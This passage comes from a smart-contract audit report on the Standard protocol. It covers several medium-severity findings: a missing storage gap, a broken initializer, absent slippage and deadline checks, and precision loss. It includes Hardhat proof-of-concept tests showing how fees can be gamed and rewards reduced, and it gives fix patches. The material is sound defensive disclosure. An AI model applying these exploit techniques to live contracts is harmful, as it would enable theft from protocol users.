    const SmartVaultIndex = await (await ethers.getContractFactory('SmartVaultIndex')).deploy();
    const NFTMetadataGenerator = await (await getNFTMetadataContract()).deploy();
    const SwapRouterMock = await (await ethers.getContractFactory('SwapRouterMock')).deploy();
    const MockWeth = await (await ethers.getContractFactory('WETHMock')).deploy();
    VaultManager = await fullyUpgradedSmartVaultManager(
      DEFAULT_COLLATERAL_RATE, PROTOCOL_FEE_RATE, EUROs.address, protocol.address, 
      liquidator.address, TokenManager.address, SmartVaultDeployer.address,
      SmartVaultIndex.address, NFTMetadataGenerator.address, MockWeth.address,
      SwapRouterMock.address
    );
    await SmartVaultIndex.setVaultManager(VaultManager.address);
    await EUROs.grantRole(await EUROs.DEFAULT_ADMIN_ROLE(), VaultManager.address);
    await VaultManager.connect(user1).mint();
    const _vault = (await VaultManager.connect(user1).vaults())[0];
    const vaultAddress = _vault.status.vaultAddress;
    Vault = await ethers.getContractAt('SmartVaultV3', vaultAddress);
    
    const LiquidationPoolManagerContract = await ethers.getContractFactory('LiquidationPoolManager');
    LiquidationPoolManager = await LiquidationPoolManagerContract.deploy(
      TST.address, EUROs.address, VaultManager.address, ClEurUsd.address, protocol.address, POOL_FEE_PERCENTAGE
    );
    await VaultManager.setLiquidatorAddress(LiquidationPoolManager.address);
    await VaultManager.setProtocolAddress(LiquidationPoolManager.address);
    LiquidationPool = await ethers.getContractAt('LiquidationPool', await LiquidationPoolManager.pool());
    await EUROs.grantRole(await EUROs.BURNER_ROLE(), LiquidationPool.address);

    // to be used for depositing as collateral, inside self-liquidation tests
    collateralCoin = await ERC20MockFactory.deploy('Collateral Coin', 'cCOIN', 18);
    ClCoinUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('cCOIN / USD');
    await TokenManager.addAcceptedToken(collateralCoin.address, ClCoinUsd.address);
  });
  
  describe('lower fee payment on minting', async () => {
    it('allows getting away with paying lesser fees for minting EUROs', async () => {
      // set price for easier calculations
      await ClEurUsd.setPrice(100000000); // €1 = $1
      await ClCoinUsd.setPrice(120600000); // 1 cCOIN = $1.206 = €1.206

      // Step 1. stake TST & EUROs
      const tstStake = 1;
      const eurosStake = 1;
      await TST.mint(user1.address, tstStake);
      await EUROs.mint(user1.address, eurosStake);
      await TST.connect(user1).approve(LiquidationPool.address, tstStake);
      await EUROs.connect(user1).approve(LiquidationPool.address, eurosStake);
      await LiquidationPool.connect(user1).increasePosition(tstStake, eurosStake);
      let { _position } = await LiquidationPool.position(user1.address);
      expect(_position.TST).to.equal(tstStake);
      expect(_position.EUROs).to.equal(eurosStake);

      // Step 2. deposit collateral & mint EUROs
      const userCollateral = ethers.utils.parseEther('1000'); // worth €1206
      await collateralCoin.mint(Vault.address, userCollateral);

      const mintedEUROs = ethers.utils.parseEther('1000'); // worth €1000. Fee = 0.5% * 1000 = €5. As (1000+5)*1.2=1206, this is the maxMintable.
      const mintFee = mintedEUROs.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC);
      await Vault.connect(user1).mint(user1.address, mintedEUROs);
      expect(await EUROs.balanceOf(user1.address)).to.equal(mintedEUROs);
      expect(await EUROs.balanceOf(LiquidationPoolManager.address)).to.equal(mintFee, "protocolFee");

      // @audit-info : user1 can receive 50% of fees = €2.5 back in his wallet
      const euroPlusMintFeeShare = mintFee.div(2).add(eurosStake);
      await LiquidationPoolManager.connect(user1).distributeFees();
      ({ _position } = await LiquidationPool.position(user1.address));
      expect(_position.EUROs).to.equal(euroPlusMintFeeShare, "euroPlusMintFeeShare"); // @audit : Hence, user1 has to pay only €2.5 fee instead of €5
    });
  });
});
```

## Impact
Malicious user is able to game the system which dilutes the fee share of other legitimate users.

## Tools Used
Hardhat

## Recommendations
Since the malicious user may use multiple wallets to carry out this attack (one for staking, one for minting), checking for a wallet's `_position` or balance won't be an effective solution. <br>
A good approach could be to introduce a time lag such that a staker has to remain in the system for a week or so before he is eligible to get a share of the fee. This will discourage such attacks which result in immediate gains.

---

### <a id="m-09"></a>[M-09]
## **Risk of upgrade issues due to missing __gap variable**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultManagerV5.sol#L16
<br>

## Summary
The `SmartVaultManagerV5` contract [inherits from OpenZeppelin upgradeable contracts](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultManagerV5.sol#L16) but does not include a `__gap` variable.
```js
contract SmartVaultManagerV5 is ISmartVaultManager, ISmartVaultManagerV2, Initializable, ERC721Upgradeable, OwnableUpgradeable {
```

Without this variable, it is not possible to add any new variables to the inherited contracts without causing storage slot issues. Specifically, if variables are added to an inherited contract, the storage slots of all subsequent variables in the contract will shift by the number of variables added. Such a shift would likely break the contract.<br>
All upgradeable OpenZeppelin contracts contain a `__gap` variable, as shown in [this figure](https://gist.github.com/t0x1cC0de/cb3683bdc70bcdb7f669586b24b5d4bd).

## Exploit Scenario
Alice, a developer of the protocol, adds a new variable to the SmartVaultManagerV5 contract as part of an upgrade. As a result of the addition, the storage slot of each subsequent variable changes, and the contract stops working.<br>

Refer [official OZ documentation](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) which says:
> You may notice that every contract includes a state variable named `__gap`. This is empty reserved space in storage that is put in place in Upgradeable contracts. It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments.
>
> It isn’t safe to simply add a state variable because it "shifts down" all of the state variables below in the inheritance chain. This makes the storage layouts incompatible, as explained in [Writing Upgradeable Contracts](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#modifying-your-contracts). The size of the `__gap` array is calculated so that the amount of storage used by a contract always adds up to the same number (in this case 50 storage slots).

## Impact
Can break future upgrades due to storage slot issues.

## Tools Used
Manual inspection

## Recommendations
Add a `__gap` variable inside `SmartVaultManagerV5.sol`. Example:
```js
uint256[50] private __gap;
```

---

### <a id="m-10"></a>[M-10]
## **Incorrect initialize() implementation makes SmartVaultManagerV5 un-upgradeable**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultManagerV5.sol#L46
<br>

## Summary & Vulnerability Details
The `SmartVaultManagerV5` contract is designed as an upgradeable contract which [inherits from OpenZeppelin upgradeable contracts](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultManagerV5.sol#L16) `ERC721Upgradeable` and `OwnableUpgradeable`:
```js
contract SmartVaultManagerV5 is ISmartVaultManager, ISmartVaultManagerV2, Initializable, ERC721Upgradeable, OwnableUpgradeable {
```

Hence as recommended, it makes use of the `function initialize()` [here](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultManagerV5.sol#L46):
```js
    function initialize() initializer public {}
```

The issue is that when using upgradeable contracts, it is important to implement an initializer which will call the base contract’s initializers in turn -
- 1. It does not call `__Ownable_init()`, which results in the following logic from `OwnableUpgradeable` to be skipped:
```js
function __Ownable_init() internal onlyInitializing {
		__Ownable_init_unchained();
}
function __Ownable_init_unchained() internal onlyInitializing {
		_transferOwnership(_msgSender());
}
```

Therefore, the contract owner stays zero initialized/does not update, and this means any function in the contract with use of `onlyOwner` is impacted.<br>

- 2. It also does not call `__ERC721_init()`, which results in the following logic from `ERC721Upgradeable` to be skipped:
```js
    /**
     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.
     */
    function __ERC721_init(string memory name_, string memory symbol_) internal onlyInitializing {
        __ERC721_init_unchained(name_, symbol_);
    }

    function __ERC721_init_unchained(string memory name_, string memory symbol_) internal onlyInitializing {
        ERC721Storage storage $ = _getERC721Storage();
        $._name = name_;
        $._symbol = symbol_;
    }
```
<br>

The `initialize()` function also lacks a check for access control and hence runs some risk of it being called by an external front-runner.

## Impact
The Pool contract is designed to be upgradeable but is actually not upgradeable.

## Tools Used
Manual inspection

## Recommendations
- Make the calls to parent initializers
- Other variables may optionally be also intitialized here
- Also, best to add a `require` statement enforcing access control so that the call to `initialize()` can not be front-run by an external user

```js
    function initialize() initializer public { // optionally pass more parameters here which can be used to initialize other variables
        require(msg.sender == DEPLOYER_ADDRESS, "Not the correct deployer");
        __ERC721_init("The Standard Smart Vault Manager", "TSVAULTMAN");
        __Ownable_init();
        // add any optional variable initializations here
    }
```

---

### <a id="m-11"></a>[M-11]
## **Minting exposes users to unlimited slippage & deadline**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L75-L77
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L71
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L162
<br>

## Summary
The [mint()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L162) function in `SmartVaultV3.sol` lets users request minting of EUROs based on the deposited collateral. Before minting EUROs, tt calculates that their requested minted amount + fee is within the fully collateralized limits. Users too would want to mint an amount which is not dangerously close to the fully collateralized figure since any minor price fluctuation will result in their immediate eligibility for being liquidated.<br>
However, there is no function parameter provided to users so that they can control the slippage or the deadline while calling `mint()` in spite of the fact that it checks the collateralization status through internal calls to  [maxMintable()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L75-L77) & [euroCollateral()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L71) which fetches the collateral price from chainlink via `calculator.tokenToEurAvg()`.<br>
As a result, users may get minted EUROs at a time much later than they placed the request to `mint()`, at a much worse collateral price than they expected, putting them dangerously close to liquidation.

```js
    function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
@---->  require(fullyCollateralised(_amount + fee), UNDER_COLL);
        minted = minted + _amount + fee;
        EUROs.mint(_to, _amount);
        EUROs.mint(ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsMinted(_to, _amount, fee);
    }
```

```js
    function fullyCollateralised(uint256 _amount) private view returns (bool) {
@--->     return minted + _amount <= maxMintable();
    }
```

```js
    function maxMintable() private view returns (uint256) {
@--->   return euroCollateral() * ISmartVaultManagerV3(manager).HUNDRED_PC() / ISmartVaultManagerV3(manager).collateralRate();
    }
```

```js
    function euroCollateral() private view returns (uint256 euros) {
        ITokenManager.Token[] memory acceptedTokens = getTokenManager().getAcceptedTokens();
        for (uint256 i = 0; i < acceptedTokens.length; i++) {
            ITokenManager.Token memory token = acceptedTokens[i];
@------>    euros += calculator.tokenToEurAvg(token, getAssetBalance(token.symbol, token.addr));
        }
    }
```

## Vulnerability details
Consider the following from [dacian's blog](https://dacian.me/defi-slippage-attacks?source=more_series_bottom_blogs#heading-minting-exposes-users-to-unlimited-slippage):
> Many DeFi protocols allow users to transfer foreign tokens to mint the protocol's native token - this is functionally the same as a swap where users are swapping foreign tokens for the protocol's native token. Since this is packaged and presented as a "mint", a slippage parameter may be omitted exposing the user to unlimited slippage!

**_Note_**:
> When implementing minting functions based upon pool reserves or other on-chain data that can be manipulated in real-time, developers should provide & auditors should verify that users can specify slippage parameters, as such mints are effectively swaps by another name!
<br>

In the context of our protocol, let's go through the following scenario:
- Alice has deposited $€1206$ worth of ETH as collateral. The current chainlink price feed of ETH/EUR is say, $1.206$ which means she has deposited $1000$ ETH. (This example is just for simplicity. Protocol actually uses ETH/USD & EUR/USD feeds to calculate the price of collateral in EUR).
- She understands that her max limit to borrow is $€1000$ worth of EUROs. This is because (€1000 + mintingFee) * collateralRate = $(€1000 + €5) * 1.2 = €1206$.
- She knows even a minor negative price fluctuation in ETH can throw her underwater and hence she plans to maintain some buffer and borrow only $€995$ EUROs.
- This gives her buffer till ETH/EUR is not below $(995 + 4.975) * 1.2 = €1199.97$
- She calls `mint(995)`
- This transaction remains stuck in the mempool for some period of time (due to low transaction fees or any other reasons) which could be minutes or hours.
- When eventually it is processed, the chainlink price feed returns a value of $€1199.97$. This puts her right on the limit of expected collateralization.
- In the next few seconds before Alice can `burn()` or make arrangements for more collateral, a slight negative price movement happens towards $€1199.96$, making her eligible for liquidation.
- She is liquidated and loses her collateral.

## Impact
Unlimited slippage and risk of liquidation for the user; loss of funds.

## Tools Used
Manual inspection

## Recommendations
Add a slippage and deadline parameter inside the `mint()` function which the user can pass. The slippage param here could refer to the user's desired value of -
- Either the minimum price of each collateralized token
- Or the minimum value of the entire collateral

before executing the mint.

---

### <a id="m-12"></a>[M-12]
## **runLiquidation() has no deadline & exposes liquidators to unlimited slippage which is dangerous when coupled with lack of access control**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L80
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L218
<br>

## Summary
Unlike the implementation in many other protocols where the liquidator calls the liquidate() function to his own benefit, the current protocol allows anybody to call the [runLiquidation()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L80) function in `LiquidationPoolManager.sol` which results in EUROs being deducted from the stakers' position and them being credited with the collateral in proportionate quantities.
<br>

Additonally, the value of the collateral going to be credited is calculated on-chain via the chainlink price feed inside [distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L218) by calling `Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData()`, but none of the above functions allow specifying a `deadline` or a slippage parameter by way of a `minimumOut` variable.
<br>

These can result in the stakers/liquidators getting a much worse deal than they bargained for.

```js
    function runLiquidation(uint256 _tokenId) external {
        ISmartVaultManager manager = ISmartVaultManager(smartVaultManager);
        manager.liquidateVault(_tokenId);
        
        ....
        ....

        }
@--->   LiquidationPool(pool).distributeAssets{value: ethBalance}(assets, manager.collateralRate(), manager.HUNDRED_PC());
        forwardRemainingRewards(tokens);
    }
```

```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
@------------>          (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
@------------>          uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;

                    ....
                    ....
    
```

## Vulnerability details
Let's go through the following scenario:
- **_Dorothy_** has deposited $€1206$ worth of ETH as collateral. The current chainlink price feed of ETH/EUR is say, $1.206$ which means she has deposited $1000$ ETH. (This example is just for simplicity. Protocol actually uses ETH/USD & EUR/USD feeds to calculate the price of collateral in EUR).
- Her max limit to borrow is $€1000$ worth of EUROs. This is because (€1000 + mintingFee) * collateralRate = $(€1000 + €5) * 1.2 = €1206$.
- She borrows $€1000$ by calling `mint()`
- Price fluctuates & the chainlink price feed returns a value of `1.2` which means $1 \text{ ETH } = €1200$. This makes her eligible for liquidation.
- **_Liam_** wishes to liquidate Dorothy. He calculates that if he liquidates now, he will get collateral worth $€1200$ at a discounted price.
- There is another equivalent staker in the vault, **_Nash_** who is not interested in liquidating Dorothy if liquidation happens in a scenario where ETH/EUR dips below `1.001` within the next 5 minutes. He believes the price drop would be too fast in that case, or anticipates a black swan event thereon and is not confident of being able to quickly dispose of the acquired ETH at any profit. So he is fine with the current liquidation price point of `1.2`, but certainly not below `1.001`.
- However, neither Liam nor Nash have any option of setting either the deadline or the slippage parameter while calling `runLiquidation()`
- **_Worse still, any external user can call_** `runLiquidation()` to initiate liquidation, even a griefer.
- So imagine that someone calls `runLiquidation()` which internally calls `distributeAssets()` on [L80](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L80) which in turn calls chainlink `latestRoundData()` on [L218](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L218) that is responsible to fetch the current chainlink price feed of the collateral/USD pair. Based on calculations in [L220](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220) the `costInEuros` is calculated, which is proportionately deducted from Liam's and Nash's EUROs balance and ETH is rewarded to them. Dorothy is now liquidated.
- The above transaction can be stuck in the mempool (due to low transaction fee provided, network congestion or some other reason) for quite long like minutes, hours or sometimes even days. As such, even though the caller of `runLiquidation()` may have called it at a time when ETH/EUR was `1.2`, it gets executed when the price feed is `1.0`, breaching the limit Nash had in mind. Note that this price difference is not contingent upon the transaction being stuck in the mempool. This price dip may well happen within seconds due to market volatility, which is never considered a red flag due to lack of a slippage check like `minimumOut`.
- Neither Nash nor Liam have any say now in whether they want to part with their EUROs or not. They are now stuck with the volatile, fast-declining ETH which thay are doubtful of being able to dispose of with any profits.

## Impact
- Unlimited slippage and risk of fund loss for the liquidators. 
- Can be an attack vector by a griefer too to result in the liquidators procuring a bad token at the cost of a good token.

## Tools Used
Manual inspection

## Recommendations
Multiple steps need to be taken:
- Add a `minimumCollateralValuation` and `deadline` parameter inside the `runLiquidation()` function which the caller can choose.

- Design a new function which allows each staker i.e. the liquidators to set their minimum threshold of collateral valuation in advance, like Nash wanted to in the above example. This could be specified in terms of a percentage dip from the current price or in absolute numbers. The percentage approach has the obvious benefit of allowing it to be set once and not tinkered with often for most market conditions, while the absolute number approach can be taken for specific niche market situations.

---

### <a id="m-13"></a>[M-13]
## **No slippage protection in swap() if it does not drop collateral value below minimum level**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L217
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L211
<br>

## Summary
[swap()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L217) is implemented in a manner which states that if after the swap has been executed, the collateral value stil remains at or above the minimum required level then [set the minimumAmountOut](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L211) to zero.<br>
This becomes the `amountOutMinimum` of the `ISwapRouter.ExactInputSingleParams` and hence there is no slippage protection.
<br>

Note that even when the protocol does calculate the `minimumAmountOut` as non-zero, it is calculated as just enough to ensure the collateral ratio is maintained. Any slight negative price fluctuations will cause the borrower to become undercollateralized and hence liquidated.

## Vulnerability details
```js
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
        uint256 swapFee = _amount * ISmartVaultManagerV3(manager).swapFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
@--->   uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: inToken,
                tokenOut: getSwapAddressFor(_outToken),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: _amount - swapFee,
@-------->      amountOutMinimum: minimumAmountOut,
                sqrtPriceLimitX96: 0
            });
        inToken == ISmartVaultManagerV3(manager).weth() ?
            executeNativeSwapAndFee(params, swapFee) :
            executeERC20SwapAndFee(params, swapFee);
    }
```

```js
    function calculateMinimumAmountOut(bytes32 _inTokenSymbol, bytes32 _outTokenSymbol, uint256 _amount) private view returns (uint256) {
        ISmartVaultManagerV3 _manager = ISmartVaultManagerV3(manager);
        uint256 requiredCollateralValue = minted * _manager.collateralRate() / _manager.HUNDRED_PC();
        uint256 collateralValueMinusSwapValue = euroCollateral() - calculator.tokenToEur(getToken(_inTokenSymbol), _amount);
        return collateralValueMinusSwapValue >= requiredCollateralValue ?
@--->       0 : calculator.eurToToken(getToken(_outTokenSymbol), requiredCollateralValue - collateralValueMinusSwapValue);
    }
```

## Impact
Unlimited slippage and risk of fund loss for the swapper.

## Tools Used
Manual inspection

## Recommendations
Allow the user to manually set the `amountOutMinimum`. The protocol can still have a logic which checks to make sure this value set by the user is above the value calculated by `calculateMinimumAmountOut()`. If not, then the value returned by `calculateMinimumAmountOut()` takes precedence.

---

### <a id="m-14"></a>[M-14]
## **Holder receives lesser reward due to division before multiplication**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L223
<br>

## Summary
[distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L223) calculates `_portion` which is awarded to the holder as reward. However in certain conditions, it performs division before multiplication as a result of which the holder receives less than expected reward.<br>
Details:
- On [L219](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L219), `_portion` is calculated as:
```js
    uint256 _portion = asset.amount * _positionStake / stakeTotal;
```

- Then, on [L222](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L222), the code checks if `costInEuros > _position.EUROs` and if `true`, `_portion` is updated as:
```js
if (costInEuros > _position.EUROs) {
    _portion = _portion * _position.EUROs / costInEuros;
```

This effectively makes the above line equivalent to:
```js
    _portion = (asset.amount * _positionStake / stakeTotal) * _position.EUROs / costInEuros; // @audit : division before multiplication
```

which is division before multiplication and hence causes precision loss. The correct code should have been:
```js
if (costInEuros > _position.EUROs) {
    _portion = asset.amount * _positionStake * _position.EUROs / costInEuros / stakeTotal;
```

I provide the PoC below which shows this loss of reward with example numbers.
<br>

## PoC
We will execute this PoC in 3 steps -
- **Step 1 :** Add a new file `test/reducedRewards.js` with the following code and run via `npx hardhat test --grep 'reduced rewards'`. You will get the output as `1`, which is the reward received by `user1`:
```js
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { ETH, getNFTMetadataContract, DEFAULT_ETH_USD_PRICE, DEFAULT_COLLATERAL_RATE, fastForward, DAY, POOL_FEE_PERCENTAGE, fullyUpgradedSmartVaultManager, PROTOCOL_FEE_RATE } = require("./common");

describe('Reward Calculation', async () => {
  let LiquidationPoolManager, LiquidationPool, TokenManager,
  TST, EUROs, ERC20MockFactory, admin, user1, user2, user3, protocol, liquidator, ClEurUsd, ClEthUsd, ClCoinUsd, VaultManager, Vault, collateralCoin, SmartVaultIndex;

  const rewardAmountForAsset = (rewards, symbol) => {
    return rewards.filter(reward => reward.symbol === ethers.utils.formatBytes32String(symbol))[0].amount;
  }

  beforeEach(async () => {
    [admin, user1, user2, user3, protocol, liquidator] = await ethers.getSigners();

    ERC20MockFactory = await ethers.getContractFactory('ERC20Mock');
    TST = await ERC20MockFactory.deploy('The Standard Token', 'TST', 18);
    EUROs = await (await ethers.getContractFactory('EUROsMock')).deploy();
    ClEurUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('EUR / USD'); 
    await ClEurUsd.setPrice(100000000); // for easier calculation
    ClEthUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('ETH / USD'); 
    await ClEthUsd.setPrice(DEFAULT_ETH_USD_PRICE);

    TokenManager = await (await ethers.getContractFactory('TokenManagerMock')).deploy(ETH, ClEthUsd.address);
    const SmartVaultDeployer = await (await ethers.getContractFactory('SmartVaultDeployerV3')).deploy(ETH, ClEurUsd.address);
    SmartVaultIndex = await (await ethers.getContractFactory('SmartVaultIndex')).deploy();
    const NFTMetadataGenerator = await (await getNFTMetadataContract()).deploy();
    const SwapRouterMock = await (await ethers.getContractFactory('SwapRouterMock')).deploy();
    const MockWeth = await (await ethers.getContractFactory('WETHMock')).deploy();
    VaultManager = await fullyUpgradedSmartVaultManager(
      DEFAULT_COLLATERAL_RATE, PROTOCOL_FEE_RATE, EUROs.address, protocol.address, 
      liquidator.address, TokenManager.address, SmartVaultDeployer.address,
      SmartVaultIndex.address, NFTMetadataGenerator.address, MockWeth.address,
      SwapRouterMock.address
    );
    await SmartVaultIndex.setVaultManager(VaultManager.address);
    await EUROs.grantRole(await EUROs.DEFAULT_ADMIN_ROLE(), VaultManager.address);
    await VaultManager.connect(user3).mint();
    const _vault = (await VaultManager.connect(user3).vaults())[0];
    const vaultAddress = _vault.status.vaultAddress;
    Vault = await ethers.getContractAt('SmartVaultV3', vaultAddress);
    
    const LiquidationPoolManagerContract = await ethers.getContractFactory('LiquidationPoolManager');
    LiquidationPoolManager = await LiquidationPoolManagerContract.deploy(
      TST.address, EUROs.address, VaultManager.address, ClEurUsd.address, protocol.address, POOL_FEE_PERCENTAGE
    );
    await VaultManager.setLiquidatorAddress(LiquidationPoolManager.address);
    await VaultManager.setProtocolAddress(LiquidationPoolManager.address);
    LiquidationPool = await ethers.getContractAt('LiquidationPool', await LiquidationPoolManager.pool());
    await EUROs.grantRole(await EUROs.BURNER_ROLE(), LiquidationPool.address);

    // to be used for depositing as collateral inside tests
    collateralCoin = await ERC20MockFactory.deploy('Collateral Coin', 'cCOIN', 18);
    ClCoinUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('cCOIN / USD');
    await ClCoinUsd.setPrice(DEFAULT_ETH_USD_PRICE); 
    await TokenManager.addAcceptedToken(collateralCoin.address, ClCoinUsd.address);
    await collateralCoin.mint(user3.address, 4);
  });
  
  describe('reduced rewards', async () => {
    it('rounds-down the rewards', async () => {
      // Step 1. stake TST & EUROs
      const tstStake1 = 3;
      const eurosStake1 = 2490;
      await TST.mint(user1.address, tstStake1);
      await EUROs.mint(user1.address, eurosStake1);
      await TST.connect(user1).approve(LiquidationPool.address, tstStake1);
      await EUROs.connect(user1).approve(LiquidationPool.address, eurosStake1);
      await LiquidationPool.connect(user1).increasePosition(tstStake1, eurosStake1);
      const tstStake2 = 2;
      const eurosStake2 = 2;
      await TST.mint(user2.address, tstStake2);
      await EUROs.mint(user2.address, eurosStake2);
      await TST.connect(user2).approve(LiquidationPool.address, tstStake2);
      await EUROs.connect(user2).approve(LiquidationPool.address, eurosStake2);
      await LiquidationPool.connect(user2).increasePosition(tstStake2, eurosStake2);
      await fastForward(DAY);
      let { _position } = await LiquidationPool.position(user1.address);
      expect(_position.TST).to.equal(tstStake1);
      expect(_position.EUROs).to.equal(eurosStake1);
      ({ _position } = await LiquidationPool.position(user2.address));
      expect(_position.TST).to.equal(tstStake2);
      expect(_position.EUROs).to.equal(eurosStake2);

      // Step 2. deposit collateral & mint EUROs
      const userCollateral = 4;
      await collateralCoin.connect(user3).mint(Vault.address, userCollateral);
      const mintedEUROs = 5000; 
      await Vault.connect(user3).mint(user3.address, mintedEUROs);
      expect(await EUROs.balanceOf(user3.address)).to.equal(mintedEUROs);

      // Step 3. Liquidate
      await ClCoinUsd.setPrice(150000000000); // $1500
      await expect(LiquidationPoolManager.connect(user1).runLiquidation(1)).not.to.be.reverted;
      const { minted, maxMintable, totalCollateralValue, collateral, liquidated } = await Vault.status();
      expect(minted).to.equal(0);
      expect(maxMintable).to.equal(0);
      expect(totalCollateralValue).to.equal(0);
      collateral.forEach(asset => expect(asset.amount).to.equal(0));
      expect(liquidated).to.equal(true);

      // check reward
      let { _rewards } = await LiquidationPool.position(user1.address);
      console.log("reward received by user1 =", rewardAmountForAsset(_rewards, 'cCOIN'));
    });
  });
});
```

Output:
```text
  Reward Calculation
    reduced rewards
reward received by user1 = BigNumber { value: "1" }
```

- **Step 2 :** Let's correct the code inside `contracts/LiquidationPool.sol` by applying the following patch:
```diff
diff --git a/contracts/LiquidationPool.sol b/contracts/LiquidationPool.sol
index e7ebe08..59fe773 100644
--- a/contracts/LiquidationPool.sol
+++ b/contracts/LiquidationPool.sol
@@ -220,7 +220,7 @@ contract LiquidationPool is ILiquidationPool {
                         uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                             * _hundredPC / _collateralRate;
                         if (costInEuros > _position.EUROs) {
-                            _portion = _portion * _position.EUROs / costInEuros;
+                            _portion = asset.amount * _positionStake * _position.EUROs / costInEuros / stakeTotal;
                             costInEuros = _position.EUROs;
                         }
                         _position.EUROs -= costInEuros;
```

- **Step 3 :** Run the test again via `npx hardhat test --grep 'reduced rewards'` to receive the output:
```text
  Reward Calculation
    reduced rewards
reward received by user1 = BigNumber { value: "2" }
```

As you can see, the current implementation awards `user1` with `1` instead of his rightful amount of `2`.

## Impact
Loss of reward for the holder.

## Tools Used
Hardhat

## Recommendations
Apply the following patch:
```diff
diff --git a/contracts/LiquidationPool.sol b/contracts/LiquidationPool.sol
index e7ebe08..59fe773 100644
--- a/contracts/LiquidationPool.sol
+++ b/contracts/LiquidationPool.sol
@@ -220,7 +220,7 @@ contract LiquidationPool is ILiquidationPool {
                         uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                             * _hundredPC / _collateralRate;
                         if (costInEuros > _position.EUROs) {
-                            _portion = _portion * _position.EUROs / costInEuros;
+                            _portion = asset.amount * _positionStake * _position.EUROs / costInEuros / stakeTotal;
                             costInEuros = _position.EUROs;
                         }
                         _position.EUROs -= costInEuros;
```

---

<br><br>

## **LOW-SEVERITY BUGS**
---

### <a id="l-01"></a>[L-01]
## **Confirmed stakers may be considered as pending on Arbitrum & lose out on rewards**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L120
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L206
<br>

## Summary
